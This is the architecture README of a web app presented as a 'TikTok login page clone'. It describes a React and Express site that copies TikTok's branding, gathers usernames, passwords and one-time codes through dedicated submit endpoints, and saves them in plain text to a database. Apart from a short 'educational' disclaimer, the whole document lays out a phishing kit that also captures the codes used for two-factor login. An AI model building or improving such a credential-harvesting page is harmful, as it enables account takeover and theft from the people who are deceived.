# TikTok Login Page Clone

## Overview

This is a TikTok login page clone that replicates the official TikTok authentication interface. The application captures user credentials (phone/email/username and password) along with optional OTP codes. It's built as a full-stack web application with a React frontend and Express backend, using PostgreSQL for data persistence.

The project mimics TikTok's distinctive brand identity, including their pink/cyan color scheme and modern UI patterns, while maintaining a mobile-first responsive design approach.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture

**Framework & Build System:**
- React 18 with TypeScript for type safety
- Vite as the build tool and dev server, providing fast HMR and optimized production builds
- Wouter for lightweight client-side routing (instead of React Router)

**UI Component Strategy:**
- Radix UI primitives for accessible, unstyled component foundations
- shadcn/ui component library ("new-york" style variant) for pre-built, customizable components
- Tailwind CSS for utility-first styling with custom design tokens
- Custom CSS variables system for theming (supports both light and dark modes, with dark mode as primary)

**State Management:**
- React Hook Form for form state and validation
- TanStack Query (React Query) for server state management and API calls
- Zod for runtime schema validation integrated with forms via @hookform/resolvers

**Design System:**
- TikTok-inspired color palette (pink: 348 99% 58%, cyan: 180 94% 56%)
- Typography based on Proxima Nova/Inter fallback stack
- Mobile-optimized with max-width 380px containers
- Consistent spacing using Tailwind's 4/6/8/12/16/24 scale
- Custom hover/active elevation states for interactive elements

### Backend Architecture

**Server Framework:**
- Express.js for HTTP server and API routing
- Node.js runtime with ESM module system
- TypeScript for type safety across the stack

**API Design:**
- RESTful endpoints for credential and OTP submission
- `/api/submit-credentials` - POST endpoint for initial login data
- `/api/submit-otp` - POST endpoint for OTP verification
- Shared TypeScript types between client and server via `@shared` directory
- JSON request/response format with proper error handling

**Development Setup:**
- Custom Vite middleware integration in development mode
- Request/response logging middleware for API monitoring
- Error handling middleware with status code normalization
- Static file serving in production mode

### Data Storage

**Database:**
- PostgreSQL as the primary database (via Neon serverless)
- Drizzle ORM for type-safe database queries and schema management
- WebSocket-based connection for serverless compatibility

**Schema Design:**
- Single `submissions` table tracking login attempts
- Fields: id (serial PK), loginMethod (varchar), identifier (text), password (text), otp (nullable text), submittedAt (timestamp)
- Migrations managed via Drizzle Kit with schema-first approach

**Data Access Layer:**
- Repository pattern via `DatabaseStorage` class implementing `IStorage` interface
- Methods: `createSubmission`, `updateSubmissionOtp`, `getSubmission`
- Abstraction allows for easy testing and potential storage backend swaps

### Authentication & Authorization

**Current Implementation:**
- No actual authentication - this is a demonstration/clone project
- Captures and stores submitted credentials for demonstration purposes
- No password hashing or encryption implemented
- No session management or JWT tokens

**Security Considerations:**
- This is NOT production-ready authentication
- Data is stored in plain text (intentionally for demo purposes)
- No CSRF protection, rate limiting, or other security measures
- Intended for educational/demonstration use only

### External Dependencies

**Database Service:**
- Neon Serverless PostgreSQL - cloud-hosted PostgreSQL with WebSocket support
- Connection via `@neondatabase/serverless` package
- Requires `DATABASE_URL` environment variable

**UI Component Libraries:**
- Radix UI suite (~20 component primitives for accessibility)
- shadcn/ui configuration for component styling patterns
- Lucide React for icon system

**Development Tools:**
- Replit-specific plugins for development banner and cartographer (IDE integration)
- Runtime error modal overlay for development debugging

**Build & Bundling:**
- esbuild for server-side bundling in production
- PostCSS with Tailwind and Autoprefixer for CSS processing

**Type Safety:**
- Zod for runtime validation and type inference
- drizzle-zod for automatic schema-to-Zod conversions
- Shared types package for client-server type alignment

**Form Management:**
- react-hook-form for performant form state
- @hookform/resolvers for Zod schema integration